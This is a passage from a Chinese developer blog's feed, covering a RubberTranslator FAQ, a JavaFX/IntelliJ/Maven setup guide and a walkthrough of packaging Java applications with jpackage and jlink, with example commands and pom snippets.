title="https://github.com/ravenxrz/RubberTranslator/wiki/OCR%EF%BC%8C%E7%99%BE%E5%BA%A6%E5%92%8C%E6%9C%89%E9%81%93%E9%85%8D%E7%BD%AE">ocr,百度，有道配置<i class="fa fa-external-link"></i></span></p><h2 id="3-常见问题"><a href="#3-常见问题" class="headerlink" title="3. 常见问题"></a>3. 常见问题</h2><h3 id="1-安装后无法打开？"><a href="#1-安装后无法打开？" class="headerlink" title="1. 安装后无法打开？"></a>1. 安装后无法打开？</h3><p>请确保安装路径无中文，如果安装在C盘，请给予管理员权限。</p><h3 id="2-翻译时段落识别问题，一段话被拆分为多段？"><a href="#2-翻译时段落识别问题，一段话被拆分为多段？" class="headerlink" title="2. 翻译时段落识别问题，一段话被拆分为多段？"></a>2. 翻译时段落识别问题，一段话被拆分为多段？</h3><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200516104744264.png" alt="image-20200516104744264"></p><p>这和RubberTranslator在格式化复制的文本时的处理机制有关，RubberTranslator在识别多段文本的原理是，判断当前是否有 英文或中文的句号在末尾， 如果在末尾则换行。所以可以看到，原文在parameter后面有句号，RubberTranslator进行了断行。</p><h3 id="3-谷歌翻译引擎下没有分段？"><a href="#3-谷歌翻译引擎下没有分段？" class="headerlink" title="3. 谷歌翻译引擎下没有分段？"></a>3. 谷歌翻译引擎下没有分段？</h3><p>是的，当前所使用的谷歌翻译引擎，会将所有文本连接成一行，所以，暂时没办法分段，后期会考虑更换接口。</p><h3 id="4-OCR、百度、有道翻译引擎无效？"><a href="#4-OCR、百度、有道翻译引擎无效？" class="headerlink" title="4. OCR、百度、有道翻译引擎无效？"></a>4. OCR、百度、有道翻译引擎无效？</h3><p>这三个功能需要用户自行配置App key &amp; secret key。请参考：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVueHJ6L1J1YmJlclRyYW5zbGF0b3Ivd2lraS9PQ1IlRUYlQkMlOEMlRTclOTklQkUlRTUlQkElQTYlRTUlOTIlOEMlRTYlOUMlODklRTklODElOTMlRTklODUlOEQlRTclQkQlQUU=" title="https://github.com/ravenxrz/RubberTranslator/wiki/OCR%EF%BC%8C%E7%99%BE%E5%BA%A6%E5%92%8C%E6%9C%89%E9%81%93%E9%85%8D%E7%BD%AE">ocr,百度，有道配置<i class="fa fa-external-link"></i></span></p><h2 id="开源许可"><a href="#开源许可" class="headerlink" title="开源许可"></a>开源许可</h2><p>GPL v3.0</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0-前言&quot;&gt;&lt;a href=&quot;#0-前言&quot; class=&quot;headerlink&quot; title=&quot;0. 前言&quot;&gt;&lt;/a&gt;0. 前言&lt;/h2&gt;&lt;p&gt;RubberTranslator是我在使用知云文献翻译和CopyTranslator两款软件后，基于javafx开发的一款文献辅助翻译软件。总体功能思想来自CopyTranslator，在此基础之上添加了自己觉得实用的功能。&lt;/p&gt;
&lt;p&gt;开源地址:&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cHM6Ly9naXRodWIuY29tL3JhdmVueHJ6L1J1YmJlclRyYW5zbGF0b3I=&quot; title=&quot;https://github.com/ravenxrz/RubberTranslator&quot;&gt;https://github.com/ravenxrz/RubberTranslator&lt;i class=&quot;fa fa-external-link&quot;&gt;&lt;/i&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;安装：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;本项目目前仅支持Windows平台，Linux之后会支持，但是Mac平台由于本人没有Mac电脑，所以无法支持，但是java是跨平台的，所以有mac电脑又有兴趣的朋友可自行打包。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;点击&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cHM6Ly9naXRodWIuY29tL3JhdmVueHJ6L1J1YmJlclRyYW5zbGF0b3IvcmVsZWFzZXM=&quot; title=&quot;https://github.com/ravenxrz/RubberTranslator/releases&quot;&gt;Releases&lt;i class=&quot;fa fa-external-link&quot;&gt;&lt;/i&gt;&lt;/span&gt;界面下载对应平台安装包即可。&lt;/li&gt;
&lt;li&gt;考虑到github国内下载速度较慢，可从&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cHM6Ly9yYXZlbnhyei5sYW56b3VzLmNvbS9iMDFiZXpiY2Y=&quot; title=&quot;https://ravenxrz.lanzous.com/b01bezbcf&quot;&gt;这里下载&lt;i class=&quot;fa fa-external-link&quot;&gt;&lt;/i&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;em&gt;注：请勿安装在有中文路径的目录下&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMWFBNDExdDdwWQ==&quot; title=&quot;https://www.bilibili.com/video/BV1aA411t7pY&quot;&gt;点这里，看视频介绍&lt;i class=&quot;fa fa-external-link&quot;&gt;&lt;/i&gt;&lt;/span&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="项目" scheme="https://www.ravenxrz.ink/categories/%E9%A1%B9%E7%9B%AE/"/>
    
    
      <category term="论文翻译" scheme="https://www.ravenxrz.ink/tags/%E8%AE%BA%E6%96%87%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>JavaFX+IDEA+Maven环境搭建</title>
    <link href="https://www.ravenxrz.ink/archives/dba39b2f.html"/>
    <id>https://www.ravenxrz.ink/archives/dba39b2f.html</id>
    <published>2020-05-06T03:09:00.000Z</published>
    <updated>2020-09-06T07:37:36.754Z</updated>
    
    <content type="html"><![CDATA[<p>本文讲解如何在Idea上搭建JavaFX开发环境，对应视频：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMXR6NDExcTdRMS8=" title="https://www.bilibili.com/video/BV1tz411q7Q1/">https://www.bilibili.com/video/BV1tz411q7Q1/<i class="fa fa-external-link"></i></span></p><p>如果想了解如何打包JavaFX程序，参见：<a href="https://www.ravenxrz.ink/archives/421e5ad2.html">https://www.ravenxrz.ink/archives/421e5ad2.html</a></p><a id="more"></a><h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><p>要搭建环境，最直接的肯定是参看官方文档了，<span class="exturl" data-url="aHR0cHM6Ly9vcGVuamZ4LmlvL29wZW5qZngtZG9jcy8=" title="https://openjfx.io/openjfx-docs/">https://openjfx.io/openjfx-docs/<i class="fa fa-external-link"></i></span></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506111205459.png" alt="image-20200506111205459"></p><p>这里再复述一遍：</p><h3 id="step1-添加archetype（只用第一次添加，后面创建项目就不用了）"><a href="#step1-添加archetype（只用第一次添加，后面创建项目就不用了）" class="headerlink" title="step1: 添加archetype（只用第一次添加，后面创建项目就不用了）"></a>step1: 添加archetype（只用第一次添加，后面创建项目就不用了）</h3><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506111939997.png" alt="image-20200506111939997"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506112020694.png" alt="image-20200506112020694"></p><ul><li><p>the groupId (org.openjfx),</p></li><li><p>the artifactId (javafx-maven-archetypes)</p></li><li><p>the version (0.0.1)</p></li></ul><h3 id="step2-创建项目"><a href="#step2-创建项目" class="headerlink" title="step2 创建项目"></a>step2 创建项目</h3><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506112115982.png" alt="image-20200506112115982"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506112145436.png" alt="image-20200506112145436"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506112203726.png" alt="image-20200506112203726"></p><p>value中填写：</p><ul><li>javafx-archetype-fxml， javafx项目包含fxml</li><li>javafx-archetype-simple， javafx项目不包含fxml</li></ul><p>二者选一，我以javafx-archetype-simple为例</p><p>然后点击右上角的+：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506112319277.png" alt="image-20200506112319277"></p><p>指定javafx的版本，目前最新为14。</p><p>Finish即可。第一次创建可能有点慢，因为maven需要下载一些依赖包。</p><p>打开pom文件，修改javafx插件版本为0.03：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">    &lt;groupId&gt;org.openjfx&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;javafx-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;0.0.3&lt;/version&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">        &lt;mainClass&gt;org.example.App&lt;/mainClass&gt;</span><br><span class="line">    &lt;/configuration&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure><p>看一下创建好的目录：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506112428268.png" alt="image-20200506112428268"></p><p>打开App，运行。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506112458825.png" alt="image-20200506112458825"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文讲解如何在Idea上搭建JavaFX开发环境，对应视频：&lt;span class=&quot;exturl&quot; data-url=&quot;aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMXR6NDExcTdRMS8=&quot; title=&quot;https://www.bilibili.com/video/BV1tz411q7Q1/&quot;&gt;https://www.bilibili.com/video/BV1tz411q7Q1/&lt;i class=&quot;fa fa-external-link&quot;&gt;&lt;/i&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;如果想了解如何打包JavaFX程序，参见：&lt;a href=&quot;https://www.ravenxrz.ink/archives/421e5ad2.html&quot;&gt;https://www.ravenxrz.ink/archives/421e5ad2.html&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="JavaFX" scheme="https://www.ravenxrz.ink/categories/JavaFX/"/>
    
    
      <category term="环境搭建" scheme="https://www.ravenxrz.ink/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>Java应用程序打包-jpackage使用记录</title>
    <link href="https://www.ravenxrz.ink/archives/421e5ad2.html"/>
    <id>https://www.ravenxrz.ink/archives/421e5ad2.html</id>
    <published>2020-05-06T00:16:53.000Z</published>
    <updated>2020-09-06T07:37:36.754Z</updated>
    
    <content type="html"><![CDATA[<p>jpackage是java 14里面自带的打包工具，jpackage解决了java开发过程中得一个难题：分发自己的程序，需要客户电脑中已安装jre环境。有了jpackage，我们可以直接将java程序打包成安装包，具体来说：</p><ul><li>Windows：exe，msi</li><li>Mac：dmg，pkg</li><li>Linux：deb，rpm</li></ul><p>jpackage目前并不成熟，但是也算是可以使用。另外，虽然jpackage可以打包各个系统的安装包，但是在一个系统上只能打对应系统的安装包。比如在windows上，就只能打成exe或msi。</p><a id="more"></a><p>额外建议：jpackage打包，涉及到java 9中的模块概念以及如何使用jlink自定义jre的知识，请自行学习。推荐阅读：</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cubGlhb3h1ZWZlbmcuY29tL3dpa2kvMTI1MjU5OTU0ODM0Mzc0NC8xMjgxNzk1OTI2NTIzOTM4" title="https://www.liaoxuefeng.com/wiki/1252599548343744/1281795926523938">模块-廖雪峰<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uaW0vcG9zdC81YTdjNjQzYTZmYjlhMDYzM2IyMGZlYmU=" title="https://juejin.im/post/5a7c643a6fb9a0633b20febe">Java9新特性系列（模块化系统: Jigsaw-&gt;Modularity）<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80NTgyNDMyNg==" title="https://zhuanlan.zhihu.com/p/45824326">我的Java（定制你的Java/JavaFX Runtime）<i class="fa fa-external-link"></i></span></li></ul><p>本文主要介绍如何使用jpackage打包，以及在打包过程中遇到的各种坑。</p><h2 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1. 环境准备"></a>1. 环境准备</h2><p>要使用jpackage打包，请确保：</p><ol><li>安装好jdk 14，配置好JAVA_HOME和PATH</li><li>windows平台，请安装<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3dpeHRvb2xzZXQvd2l4Mw==" title="https://github.com/wixtoolset/wix3">wix3<i class="fa fa-external-link"></i></span></li></ol><p>安装好，打开cmd，执行jpackage -h：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506083414289.png" alt="image-20200506083414289"></p><p>如果有这样的显示，那说明安装成功。注意首行的WARNING，这个不用管，因为jpackage目前还属于一个孵化阶段，所有有这样的提示。</p><p>另外，下文中的所有程序都可放在了github，地址：</p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVuLW1pc2MvanBhY2thZ2UtZGVtbw==" title="https://github.com/raven-misc/jpackage-demo">https://github.com/raven-misc/jpackage-demo<i class="fa fa-external-link"></i></span></p><h2 id="2-非模块程序打包"><a href="#2-非模块程序打包" class="headerlink" title="2. 非模块程序打包"></a>2. 非模块程序打包</h2><p>先以<strong>非模块程序</strong>为例，新建一个java项目，得到如下目录：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506085408605.png" alt="image-20200506085408605"></p><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.raven;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Raven</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 1.0</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2020/5/6 8:53</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Toolkit.getDefaultToolkit().beep();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>功能很简单，让系统发出beep声。</p><p>然后将这个项目打包成jar包，可以通过命令，也可以直接通过idea，自行选择，我这里采用idea：</p><p><img data-src="https://pic.downk.cc/item/5eb22654c2a9a83be5ae6281.png" alt="image-20200506085602846"></p><p>测试一下通过java -jar能否运行：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506090006946.png" alt="image-20200506090006946"></p><p>好的，现在我们将这个jar包打成安装包：</p><p>在根目录下建立一个lib，并把Non-modular-packging-demo.jar复制进lib目录下：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506090210470.png" alt="image-20200506090210470"></p><h3 id="2-1-安装包"><a href="#2-1-安装包" class="headerlink" title="2.1 安装包"></a>2.1 安装包</h3><p>在根目录下，打开你的terminal，执行（命令是执行不成功的，会报311错误，但是先执行看看）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jpackage --name Non-modular-installer --input lib --main-class com.raven.App --main-jar Non-m</span><br><span class="line">odular-packaging-demo.jar</span><br></pre></td></tr></table></figure><ul><li>–name 打包后的安装包名</li><li>–input  要打包的文件目录</li><li>–main-class 这是非必须选项，如果你的jar包META-INF/MANIFEST.MF中已经指定了Main-Class, 则无需此命令。</li><li>–main-jar 主程序所在jar包</li><li>其余常用：<ul><li>–temp 临时文件所在目录，默认系统temp</li><li>–dest 打包到哪个目录下,默认当前目录</li><li>–type 打包成什么类型，exe？msi？deb等等，windows默认是exe</li></ul></li></ul><p>不过在我使用这条命令时(2020/5/5)，<strong>报了311错误</strong>，源头来自wix。解决方案，在命令后指定vendor，如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jpackage --name Non-modular-installer --input lib --main-class com.raven.App --main-jar Non-m</span><br><span class="line">odular-packaging-demo.jar --vendor raven</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506091042775.png" alt="image-20200506091042775"></p><p>ok，已经打包成功，试试安装吧（提示，又会有想不到的效果）。</p><p>相信你通过双击安装，已经发现了问题，那就是安装后没有任何效果，没有windows-menu，没有windows快捷键，程序也没有运行启动。但是<strong>控制面板已经找到安装程序了</strong>。我一度以为是自己电脑环境的问题，最后发现在windows平台上还需加上几条命令才行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpackage --name Non-modular-installer --input lib --main-class com.raven.App --main-jar Non-modular-packaging-demo.jar --vendor raven --win-dir-chooser --win-shortcut --win-menu-group &quot;Non-modular-packaging&quot; --win-menu</span><br></pre></td></tr></table></figure><p>解释：</p><ul><li>–win-dir-chooser, 安装时添加“选择安装路路径”</li><li>–win-shortcut,安装后自动在桌面添加快捷键</li><li>–win-menu-group,启动该应用程序所在的菜单组(实测无效，但是必须有这条命令，没有–win-menu会报311错误)</li><li>–win-menu，添加到系统菜单中</li></ul><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506091723697.png" alt="image-20200506091723697"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506091759019.png" alt="image-20200506091759019"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506091808728.png" alt="image-20200506091808728"></p><p>现在双击启动程序试试，应该就有beep了。再看看安装目录：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506092615980.png" alt="image-20200506092615980"></p><h3 id="2-2-便携版（无需安装）"><a href="#2-2-便携版（无需安装）" class="headerlink" title="2.2 便携版（无需安装）"></a>2.2 便携版（无需安装）</h3><p>jpackage提供一个选项，可以用来生成镜像（image），而这个镜像就可以充当便携版执行命令和上面基本一致，添加–type app-image命令,删除所有–win-xxx即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpackage --name Non-modular-installer --type app-image --input lib --main-class com.raven.App --main-jar Non-modular-packaging-demo.jar --vendor raven</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506092833058.png" alt="image-20200506092833058"></p><p>内部目录和安装包安装后的目录完全一致，所以直接压缩这个文件夹就有便携版了。</p><h3 id="2-3-便携版–-gt-安装包"><a href="#2-3-便携版–-gt-安装包" class="headerlink" title="2.3 便携版–&gt;安装包"></a>2.3 便携版–&gt;安装包</h3><p>我们打包成镜像后，还可以将镜像转化为安装包（通常发生在我们想对镜像做一些定制化内容时），执行命令:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpackage --name Non-modular-installer --type msi --app-image Non-modular-installer --vendor raven</span><br></pre></td></tr></table></figure><p>这里打包成msi:</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506093330774.png" alt="image-20200506093330774"></p><h2 id="3-模块程序打包"><a href="#3-模块程序打包" class="headerlink" title="3. 模块程序打包"></a>3. 模块程序打包</h2><p>通过maven新建JavaFX项目，得到如下目录：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506085023406.png" alt="image-20200506085023406"></p><p>运行一下，看下效果：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506093953328.png" alt="image-20200506093953328"></p><p>模块化程序打包就略微复杂一些了，首先明确一点，idea中，有maven在，所有的编译输出不在out目录下，而在target目录下：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506094133814.png" alt="image-20200506094133814"></p><p>除此之外，还需要明确我们当前的模块名：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506094239319.png" alt="image-20200506094239319"></p><p>当前模块名为app。</p><h3 id="2-1-字节码打包"><a href="#2-1-字节码打包" class="headerlink" title="2.1 字节码打包"></a>2.1 字节码打包</h3><p>首先确定依赖的modules，在module-info.java文件中，</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506095324701.png" alt="image-20200506095324701"></p><p>生成如下的依赖图：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506095350078.png" alt="image-20200506095350078"></p><p>不用关注java开头和jdk开头的模块，因为它们是系统自带的。也就是所当前app模块直接或间接依赖了：</p><ul><li>javafx.controls</li><li>javafx.graphics</li><li>javafx.base</li></ul><p>三个模块，现在我们要找到这个三个模块jar包路径，如何找？</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506095511115.png" alt="image-20200506095511115"></p><p>在这上面右键–&gt;Show in Exploer即可。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506095601116.png" alt="image-20200506095601116"></p><p>可以看到导航到了我们的maven仓库中，分别记下这三个jar包的路径，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Raven\.m2\repository\org\openjfx\javafx-controls\14\javafx-controls-14 win.jar;C:\Users\Raven\.m2\repository\org\openjfx\javafx-base\14\javafx-base-14-win.jar;C:\Users\Raven\.m2\repository\org\openjfx\javafx-graphics\14\javafx-graphics-14-win.jar</span><br></pre></td></tr></table></figure><p><strong>现在都是自己手动找的，之后会介绍插件，自动寻找。</strong></p><p>ok，准备工作就绪，开始打包。在target目录下，打开terminal：</p><p>执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpackage --name &quot;Modular-installer&quot; --module-path classes;C:\Users\Raven\.m2\repository\org\openjfx\javafx-controls\14\javafx-controls-14-win.jar;C:\Users\Raven\.m2\repository\org\openjfx\javafx-base\14\javafx-base-14-win.jar;C:\Users\Raven\.m2\repository\org\openjfx\javafx-graphics\14\javafx-graphics-14-win.jar -m app/com.raven.App --vendor raven</span><br></pre></td></tr></table></figure><p>解释：</p><ul><li>–name 应用程序名</li><li>–module-path: 也就是前面让你找的几个依赖模块的jar包路径（以;间隔）+classes（自己的模块）</li><li>-m: 指定主模块及主程序。 app/com.raven.App, “/“前是模块名，”/“后是主程序全路径。</li></ul><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506100019571.png" alt="image-20200506100019571"></p><p>现在还会遇到的问题，在”非模块程序打包“下都已经作了说明，现在补全所有命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpackage --name &quot;Modular-installer&quot; --module-path classes;C:\Users\Raven\.m2\repository\org\openjfx\javafx-controls\14\javafx-controls-14-win.jar;C:\Users\Raven\.m2\repository\org\openjfx\javafx-base\14\javafx-base-14-win.jar;C:\Users\Raven\.m2\repository\org\openjfx\javafx-graphics\14\javafx-graphics-14-win.jar -m app/com.raven.App --vendor raven --win-dir-chooser --win-shortcut --win-menu-group &quot;Modular-packaging&quot; --win-menu</span><br></pre></td></tr></table></figure><h3 id="2-2-通过jar包打包"><a href="#2-2-通过jar包打包" class="headerlink" title="2.2 通过jar包打包"></a>2.2 通过jar包打包</h3><p>注意到我们上面module-path中有一项是classes，这就是我们自己的模块，我们也可以先将整个模块打包成jar包，然后替换classes。</p><p>有maven，打包就是再简单不过的事了，</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506100337247.png" alt="image-20200506100337247"></p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506100405088.png" alt="image-20200506100405088"></p><p>重新执行命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpackage --name &quot;Modular-installer&quot; --module-path Modular-packaging-demo-1.0-SNAPSHOT.jar;C:\Users\Raven\.m2\repository\org\openjfx\javafx-controls\14\javafx-controls-14-win.jar;C:\Users\Raven\.m2\repository\org\openjfx\javafx-base\14\javafx-base-14-win.jar;C:\Users\Raven\.m2\repository\org\openjfx\javafx-graphics\14\javafx-graphics-14-win.jar -m app/com.raven.App --vendor raven --win-dir-chooser --win-shortcut --win-menu-group &quot;Modular-packaging&quot; --win-menu</span><br></pre></td></tr></table></figure><h3 id="2-3-打包成镜像（便携版）"><a href="#2-3-打包成镜像（便携版）" class="headerlink" title="2.3 打包成镜像（便携版）"></a>2.3 打包成镜像（便携版）</h3><p>同”非模块程序打包“一样，添加–type,删除–win-xx</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpackage --name &quot;Modular-installer&quot; --module-path Modular-packaging-demo-1.0-SNAPSHOT.jar;C:\Users\Raven\.m2\repository\org\openjfx\javafx-controls\14\javafx-controls-14-win.jar;C:\Users\Raven\.m2\repository\org\openjfx\javafx-base\14\javafx-base-14-win.jar;C:\Users\Raven\.m2\repository\org\openjfx\javafx-graphics\14\javafx-graphics-14-win.jar -m app/com.raven.App --vendor raven --type app-image</span><br></pre></td></tr></table></figure><h3 id="2-4-定制jre，自定义jlink，插件化（推荐打包方式）"><a href="#2-4-定制jre，自定义jlink，插件化（推荐打包方式）" class="headerlink" title="2.4 定制jre，自定义jlink，插件化（推荐打包方式）"></a>2.4 定制jre，自定义jlink，插件化（推荐打包方式）</h3><p>在jpackage打包模块化程序时，其实底层调用了jlink，比如我们的–module-path参数，其实时会传递给jlink的。当我们需要对jlink做一些自定义参数时，可以先调用jlink生成自定义的jre，然后通过这个jre来打包。</p><p>前面的打包过程，有一个非常头疼的问题，那就是需要我们自己去寻找依赖，然后找到这些一些的路径。（当然其实下载jmods也是可以的，但是还是麻烦的），还好我们有插件辅助。</p><p>打开pom文件，会看到这个插件：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">    &lt;groupId&gt;org.openjfx&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;javafx-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;0.0.3&lt;/version&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">        &lt;mainClass&gt;com.raven.App&lt;/mainClass&gt;</span><br><span class="line">    &lt;/configuration&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure><p>注意版本一定要是0.0.3+。然后点击：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506102259548.png" alt="image-20200506102259548"></p><p>会得到：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506102410359.png" alt="image-20200506102410359"></p><p>在image/bin中打开terminal，执行<code>java --list-modules</code>命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">app</span><br><span class="line">java.base@14.0.1</span><br><span class="line">java.datatransfer@14.0.1</span><br><span class="line">java.desktop@14.0.1</span><br><span class="line">java.prefs@14.0.1</span><br><span class="line">java.xml@14.0.1</span><br><span class="line">javafx.base</span><br><span class="line">javafx.controls</span><br><span class="line">javafx.graphics</span><br><span class="line">jdk.unsupported@14.0.1</span><br></pre></td></tr></table></figure><p>上面就是我们这个jre所包含的所有模块。可以和我们之前做依赖分析的图做对比，是不是完全相同？<br>接着我们通过jre来进行打包。</p><p>回到target目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpackage -n Modular-packaging-demo --type msi --runtime-image image --vendor raven</span><br></pre></td></tr></table></figure><p>老规矩，如果需要menu，shortcut，自己添加。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200506102742159.png" 